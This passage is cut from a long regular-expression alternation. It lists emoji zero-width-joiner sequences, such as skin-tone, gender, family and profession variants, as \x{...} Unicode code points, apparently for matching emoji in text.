2640}\x{fe0f}|\x{1f473}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f6b6}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9d1}\x{1f3ff}\x{200d}\x{2695}\x{fe0f}|\x{1f64d}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f645}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f575}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f647}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f481}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f647}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f481}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{1f3fc}\x{200d}\x{2708}\x{fe0f}|\x{1f481}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f647}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f481}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9dc}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{1f3fd}\x{200d}\x{2708}\x{fe0f}|\x{1f481}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f647}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f481}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f481}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f647}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f481}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f481}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{1f3fe}\x{200d}\x{2708}\x{fe0f}|\x{1f646}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f647}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f646}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f46e}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f646}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f646}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f46e}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9ce}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f3c3}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f647}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f9ce}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f9ce}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f647}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9ce}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{1f3fb}\x{200d}\x{2708}\x{fe0f}|\x{1f9ce}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f481}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f3c3}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f46e}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f3c3}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f64b}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f64b}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f9cf}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{1f3fd}\x{200d}\x{2708}\x{fe0f}|\x{1f9cf}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f3c3}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f469}\x{1f3fe}\x{200d}\x{2708}\x{fe0f}|\x{1f64b}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f3c3}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9cf}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9cf}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9cf}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f9ce}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f9cf}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9cf}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{1f3fc}\x{200d}\x{2708}\x{fe0f}|\x{1f3c3}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f64b}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{1f3ff}\x{200d}\x{2708}\x{fe0f}|\x{1f3c3}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f3c3}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f64b}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f3c3}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f64b}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f3c3}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f64b}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f64b}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f469}\x{1f3fb}\x{200d}\x{2708}\x{fe0f}|\x{1f64b}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9cf}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f9ce}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f64b}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9cf}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f646}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f46e}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f64d}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f64e}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f926}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f575}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f64e}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f575}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f64e}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f926}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f575}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f575}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f64e}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f64e}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f575}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9d6}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f926}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f9d6}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f64e}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f64e}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f575}\x{fe0f}\x{200d}\x{2642}\x{fe0f}|\x{1f9d6}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f926}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f64d}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f575}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f64d}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f9ce}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f575}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f575}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f64e}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9d6}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f9cd}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f9d6}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f64e}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f926}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f64e}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f575}\x{fe0f}\x{200d}\x{2640}\x{fe0f}|\x{1f926}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9cd}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f646}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f646}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f46e}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f9d6}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9d1}\x{1f3fe}\x{200d}\x{2708}\x{fe0f}|\x{1f9d6}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f46e}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9d6}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f647}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f645}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f646}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f9d1}\x{1f3ff}\x{200d}\x{2708}\x{fe0f}|\x{1f646}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f46e}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f646}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f647}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f9d6}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f46e}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f9d6}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f645}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f645}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f645}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f9cd}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f645}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9d1}\x{1f3fb}\x{200d}\x{2708}\x{fe0f}|\x{1f645}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f9ce}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f645}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f9d1}\x{1f3fc}\x{200d}\x{2708}\x{fe0f}|\x{1f46e}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f645}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f645}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f46e}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f6a3}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f9d1}\x{1f3fd}\x{200d}\x{2708}\x{fe0f}|\x{1f469}\x{1f3ff}\x{200d}\x{2695}\x{fe0f}|\x{1f3ca}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f486}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f9dd}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9d9}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9d9}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f468}\x{1f3fc}\x{200d}\x{2696}\x{fe0f}|\x{1f93d}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9d9}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f93d}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f93d}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9d9}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f93d}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{1f3fd}\x{200d}\x{2696}\x{fe0f}|\x{1f93d}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9d9}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f468}\x{1f3fe}\x{200d}\x{2696}\x{fe0f}|\x{1f93d}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f93d}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f468}\x{1f3fb}\x{200d}\x{2696}\x{fe0f}|\x{1f93e}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f469}\x{1f3fb}\x{200d}\x{2696}\x{fe0f}|\x{1f93e}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9da}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f93e}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f93e}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9da}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f93e}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f93d}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f9da}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9dd}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f93d}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f468}\x{1f3ff}\x{200d}\x{2696}\x{fe0f}|\x{1f93d}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f9dd}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f9dd}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f938}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f93e}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9b9}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f6b5}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f9dd}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f6b5}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f9d1}\x{1f3fc}\x{200d}\x{2696}\x{fe0f}|\x{1f6b5}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f6b5}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f6b5}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9dd}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9d1}\x{1f3fb}\x{200d}\x{2696}\x{fe0f}|\x{1f9b9}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f6b5}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9b9}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f6b5}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f6b5}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9d1}\x{1f3fd}\x{200d}\x{2696}\x{fe0f}|\x{1f938}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9d9}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9d1}\x{1f3ff}\x{200d}\x{2696}\x{fe0f}|\x{1f938}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f938}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f9d9}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f938}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f938}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9d9}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9d9}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f938}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f938}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f6a3}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f938}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f9d9}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f938}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9d1}\x{1f3fe}\x{200d}\x{2696}\x{fe0f}|\x{1f9da}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f9da}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f6b5}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f9d1}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}|\x{1f468}\x{200d}\x{1f468}\x{200d}\x{1f466}|\x{1f468}\x{200d}\x{1f469}\x{200d}\x{1f467}|\x{1f468}\x{200d}\x{1f469}\x{200d}\x{1f466}|\x{1f469}\x{200d}\x{2764}\x{200d}\x{1f469}|\x{1f468}\x{200d}\x{2764}\x{200d}\x{1f468}|\x{1f469}\x{200d}\x{2764}\x{200d}\x{1f468}|\x{1f9db}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{200d}\x{1f469}\x{200d}\x{1f466}|\x{1f9d8}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f9dc}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f9d8}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f9d8}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f441}\x{fe0f}\x{200d}\x{1f5e8}\x{fe0f}|\x{1f9db}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{200d}\x{1f468}\x{200d}\x{1f467}|\x{1f469}\x{200d}\x{1f469}\x{200d}\x{1f467}|\x{1f9db}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f9db}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f9dc}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9dc}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f9dc}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9dc}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9dc}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9db}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{200d}\x{1f467}\x{200d}\x{1f467}|\x{1f468}\x{200d}\x{1f466}\x{200d}\x{1f466}|\x{1f469}\x{200d}\x{1f467}\x{200d}\x{1f466}|\x{1f9db}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{200d}\x{1f466}\x{200d}\x{1f466}|\x{1f468}\x{200d}\x{1f467}\x{200d}\x{1f467}|\x{1f468}\x{200d}\x{1f467}\x{200d}\x{1f466}|\x{1f9db}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f9d8}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f9d8}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f93e}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f939}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9da}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f939}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f939}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9da}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f939}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f469}\x{1f3fe}\x{200d}\x{2696}\x{fe0f}|\x{1f9da}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{1f3ff}\x{200d}\x{2696}\x{fe0f}|\x{1f9da}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f93e}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{1f3fd}\x{200d}\x{2696}\x{fe0f}|\x{1f93e}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f93e}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{1f3fc}\x{200d}\x{2696}\x{fe0f}|\x{1f939}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9da}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f9db}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9d8}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9d8}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9db}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f9d8}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f9d8}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9db}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9d8}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f9dc}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f939}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f939}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f9dc}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f939}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f939}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f9dc}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f939}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f9b9}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{1f3ff}\x{200d}\x{2708}\x{fe0f}|\x{1f3cb}\x{fe0f}\x{200d}\x{2642}\x{fe0f}|\x{1f9dd}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f9cf}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f3cb}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f486}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9dd}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{26f9}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f3cb}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f3ca}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9b8}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f3cb}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f486}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f6b4}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{26f9}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9b8}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f3ca}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f486}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f3cb}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f3cb}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9b8}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f6b5}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9b8}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f3cb}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9b8}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f9b8}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f3cb}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f3cb}\x{fe0f}\x{200d}\x{2640}\x{fe0f}|\x{26f9}\x{fe0f}\x{200d}\x{2642}\x{fe0f}|\x{1f486}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{26f9}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f3ca}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f3ca}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f3cb}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f3cb}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9b8}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f3ca}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f486}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f3cb}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f9dd}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f6b4}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f3ca}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f9b9}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9b8}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f6b4}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9b8}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{26f9}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f6b4}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f9b9}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f6b4}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f3ca}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{26f9}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f9b9}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{26f9}\x{fe0f}\x{200d}\x{2640}\x{fe0f}|\x{1f6b4}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f9b8}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f9dd}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f486}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{26f9}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9b9}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{26f9}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f6b4}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{26f9}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f3ca}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f6b4}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f6b4}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{26f9}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f3ca}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9b9}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f486}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f6b4}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{26f9}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f9b9}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{1f3fd}\x{200d}\x{1f527}|\x{1f468}\x{1f3fe}\x{200d}\x{1f527}|\x{1f9d1}\x{1f3ff}\x{200d}\x{2708}|\x{1f468}\x{1f3fd}\x{200d}\x{1f4bb}|\x{1f468}\x{1f3fd}\x{200d}\x{1f52c}|\x{1f468}\x{1f3fb}\x{200d}\x{2708}|\x{1f468}\x{200d}\x{2708}\x{fe0f}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f52c}|\x{1f468}\x{1f3fb}\x{200d}\x{1f527}|\x{1f468}\x{1f3ff}\x{200d}\x{1f527}|\x{1f469}\x{1f3fc}\x{200d}\x{1f9af}|\x{1f468}\x{1f3fb}\x{200d}\x{1f52c}|\x{1f468}\x{1f3fc}\x{200d}\x{1f527}|\x{1f468}\x{1f3fe}\x{200d}\x{1f4bb}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f52c}|\x{1f468}\x{1f3fc}\x{200d}\x{1f52c}|\x{1f469}\x{1f3fd}\x{200d}\x{1f9af}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f4bb}|\x{1f468}\x{1f3fc}\x{200d}\x{1f4bb}|\x{1f469}\x{1f3fc}\x{200d}\x{1f373}|\x{1f469}\x{1f3ff}\x{200d}\x{1f52c}|\x{1f469}\x{1f3fe}\x{200d}\x{1f9af}|\x{1f469}\x{1f3ff}\x{200d}\x{1f373}|\x{1f469}\x{1f3fc}\x{200d}\x{2708}|\x{1f469}\x{1f3fe}\x{200d}\x{1f373}|\x{1f469}\x{1f3fd}\x{200d}\x{1f373}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f4bb}|\x{1f469}\x{1f3fb}\x{200d}\x{1f373}|\x{1f469}\x{1f3fe}\x{200d}\x{1f52c}|\x{1f469}\x{1f3fd}\x{200d}\x{2708}|\x{1f469}\x{1f3ff}\x{200d}\x{1f9af}|\x{1f469}\x{1f3fe}\x{200d}\x{2708}|\x{1f468}\x{1f3ff}\x{200d}\x{1f373}|\x{1f9d1}\x{1f3fe}